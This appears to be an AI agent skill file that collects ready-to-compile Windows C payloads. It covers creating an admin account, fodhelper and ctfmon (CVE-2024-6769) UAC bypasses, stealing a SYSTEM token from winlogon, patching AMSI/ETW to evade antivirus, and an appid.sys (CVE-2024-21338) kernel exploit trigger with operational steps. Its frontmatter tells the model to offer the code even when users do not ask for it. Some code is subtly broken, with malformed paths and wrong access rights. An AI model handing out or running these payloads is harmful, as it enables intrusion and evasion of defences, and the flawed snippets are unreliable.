---
name: windows-c-payloads
description: Windows C code snippets for privilege escalation, UAC bypass, token manipulation, AMSI/ETW patching, and post-exploitation. Use this skill whenever the user mentions Windows privilege escalation, UAC bypass, token theft, AMSI bypass, EDR evasion, SYSTEM shell spawning, PPL processes, or needs ready-to-compile C payloads for Windows red teaming, CTFs, or security research. Trigger even if they don't explicitly say "C code" or "payload" — if they're working on Windows post-exploitation or need to escalate privileges, this skill has the code.
---

# Windows C Payloads

Ready-to-compile C snippets for Windows Local Privilege Escalation and post-exploitation. Each payload is self-contained, requires only the Windows API/C runtime, and compiles with MinGW.

**Prerequisites**: These payloads assume you already have code execution and the minimum privileges needed (e.g., `SeDebugPrivilege`, `SeImpersonatePrivilege`, or medium-integrity for UAC bypass). Intended for red-team, CTF, or authorized security research contexts.

---

## Quick Reference

| Payload | Use Case | Privileges Needed |
|---------|----------|-------------------|
| `addadmin.c` | Create local admin user | None (already admin) |
| `uac_fodhelper.c` | UAC bypass via registry hijack | Medium integrity |
| `uac_ctfmon.c` | UAC bypass via activation context cache | Medium integrity |
| `system_shell.c` | Spawn SYSTEM shell via token dup | `SeDebug` + `SeImpersonate` |
| `patch_amsi.c` | Patch AMSI & ETW in-process | None |
| `spawn_ppl.c` | Create Protected Process Light child | None (target must be signed) |
| `appid_trigger.c` | `appid.sys` smart-hash abuse | `LOCAL SERVICE` token |

---

## Add Local Administrator User

Creates a new user and adds them to the Administrators group.

**Compile:**
```bash
i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
```

**Code:**
```c
#include <stdlib.h>
int main(void) {
    system("net user hacker Hacker123! /add");
    system("net localgroup administrators hacker /add");
    return 0;
}
```

**Usage**: Replace `hacker` and `Hacker123!` with your desired username and password.

---

## UAC Bypass – `fodhelper.exe` Registry Hijack

When `fodhelper.exe` runs, it queries a registry key without filtering the `DelegateExecute` verb. Plant your command there to bypass UAC without dropping files to disk.

**Registry path:** `HKCU\Software\Classes\ms-settings\Shell\Open\command`

**Compile:**
```bash
x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
```

**Code:**
```c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
    HKEY hKey;
    const char *payload = "C:\\Windows\\System32\\cmd.exe";

    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
        KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        RegSetValueExA(hKey, NULL, 0, REG_SZ,
            (const BYTE*)payload, (DWORD)strlen(payload) + 1);

        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
            (const BYTE*)"", 1);

        RegCloseKey(hKey);
        system("fodhelper.exe");
    }
    return 0;
}
```

**Tested**: Windows 10 22H2, Windows 11 23H2 (July 2025 patches).

---

## UAC Bypass – Activation Context Cache Poisoning (CVE-2024-6769)

Drive remapping + activation context cache poisoning against `ctfmon.exe`. Remap `C:` to attacker-controlled storage, drop trojanized DLL, launch `ctfmon.exe` to gain high integrity.

**Compile:**
```bash
x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_ctfmon.exe uac_ctfmon.c -lshlwapi
```

**Code:**
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
    BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
    CloseHandle(h);
    return ok;
}

int wmain(void) {
    const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
    SHCreateDirectoryExW(NULL, stage, NULL);
    CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
    CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

    DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
                     L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

    const wchar_t manifest[] =
        L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
        L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
        L" <dependency><dependentAssembly>"
        L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
        L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
        L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
        L" </dependentAssembly></dependency></assembly>";
    WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

    ACTCTXW act = { sizeof(act) };
    act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
    ULONG_PTR cookie = 0;
    HANDLE ctx = CreateActCtxW(&act);
    ActivateActCtx(ctx, &cookie);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, 2000);
    DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
    return 0;
}
```

**Cleanup**: After gaining SYSTEM, run `sxstrace Trace -logfile %TEMP%\sxstrace.etl` then `sxstrace Parse` to check for manifest traces.

---

## Spawn SYSTEM Shell via Token Duplication

Steal the token from `winlogon.exe`, duplicate it, and spawn an elevated process. Requires both `SeDebugPrivilege` and `SeImpersonatePrivilege`.

**Compile:**
```bash
x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
```

**Code:**
```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    if (!Process32FirstW(snap, &pe)) return 0;
    do {
        if (!_wcsicmp(pe.szExeFile, name)) {
            DWORD pid = pe.th32ProcessID;
            CloseHandle(snap);
            return pid;
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return 0;
}

int wmain(void) {
    DWORD pid = FindPid(L"winlogon.exe");
    if (!pid) return 1;

    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    HANDLE hToken = NULL, dupToken = NULL;

    if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
        DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

        STARTUPINFOW si = { .cb = sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
                L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
                NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    if (hProc) CloseHandle(hProc);
    if (hToken) CloseHandle(hToken);
    if (dupToken) CloseHandle(dupToken);
    return 0;
}
```

---

## In-Memory AMSI & ETW Patch

Patch AMSI and ETW interfaces in the current process to prevent script-based payloads from being scanned by AV/EDR.

**Compile:**
```bash
gcc -o patch_amsi.exe patch_amsi.c -lntdll
```

**Code:**
```c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
    DWORD oldProt;
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
    VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
    memcpy(address, patch, sizeof(patch));
    VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
    if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

    MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
    return 0;
}
```

**Note**: This is process-local. Spawn new PowerShell/Python processes after running this payload.

---

## Create Child as Protected Process Light (PPL)

Request PPL protection level for a child process at creation time. Only succeeds if the target image is signed for the requested signer class.

**Compile:**
```bash
x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
```

**Code:**
```c
#include <windows.h>

int wmain(void) {
    STARTUPINFOEXW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.StartupInfo.cb = sizeof(si);

    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

    DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT;
    UpdateProcThreadAttribute(si.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
        &lvl, sizeof(lvl), NULL, NULL);

    if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
                        EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
        return 1; // Likely ERROR_INVALID_IMAGE_HASH (577)
    }
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```

**Protection levels:**
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

**Validate**: Check the Protection column in Process Explorer or Process Hacker.

---

## `appid.sys` Smart-Hash Abuse (CVE-2024-21338)

`appid.sys` exposes a device object (`\\.\AppID`) whose smart-hash IOCTL accepts user-supplied function pointers when caller runs as `LOCAL SERVICE`.

**Compile:**
```bash
x86_64-w64-mingw32-gcc -O2 -o appid_trigger.exe appid_trigger.c
```

**Code:**
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
    ULONGLONG UnknownCtx[4];
    PVOID QuerySize;
    PVOID ReadBuffer;
    BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
    // Map SYSTEM shellcode, steal token, etc.
    return 0;
}

int wmain(void) {
    HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hDev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFileW failed: %lu\n", GetLastError());
        return 1;
    }

    APPID_SMART_HASH in = {0};
    in.QuerySize = KernelThunk;
    in.ReadBuffer = KernelThunk;

    DWORD bytes = 0;
    if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
        printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
    }
    CloseHandle(hDev);
    return 0;
}
```

**Operational notes:**
1. Steal `LOCAL SERVICE` token from `Schedule` or `WdiServiceHost` using `SeImpersonatePrivilege`
2. Impersonate before touching the device so ACL checks pass
3. Map an RWX section with `VirtualAlloc`, copy your token duplication stub there
4. Set `KernelThunk = section` and call `DeviceIoControl`
5. Close the device handle immediately after gaining SYSTEM

---

## References

- Ron Bowes – "Fodhelper UAC Bypass Deep Dive" (2024)
- SplinterCode – "AMSI Bypass 2023: The Smallest Patch Is Still Enough" (BlackHat Asia 2023)
- CreateProcessAsPPL: https://github.com/2x7EQ13/CreateProcessAsPPL
- Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList
- DarkReading – "Novel Exploit Chain Enables Windows UAC Bypass" (2024)
- Avast Threat Labs – "Lazarus Deploys New FudModule Rootkit" (2024)
